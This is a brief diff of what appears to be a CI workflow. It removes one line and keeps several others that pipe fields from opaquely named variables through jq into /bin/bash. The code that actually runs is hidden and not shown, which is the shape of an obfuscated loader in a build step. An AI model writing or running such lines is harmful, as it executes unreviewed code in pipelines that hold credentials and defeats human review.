@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$bw3306" | jq -r .clwb9 | /bin/bash
           echo $dutx56912 | jq -r .hl9 | /bin/bash
           echo $vax30819 | jq -r .xis6976 | /bin/bash
-          echo $hf71684 | jq -r .pp97 | /bin/bash
           echo $c1766 | jq -r .ijr5031 | /bin/bash
 
       - name: Upload artifact
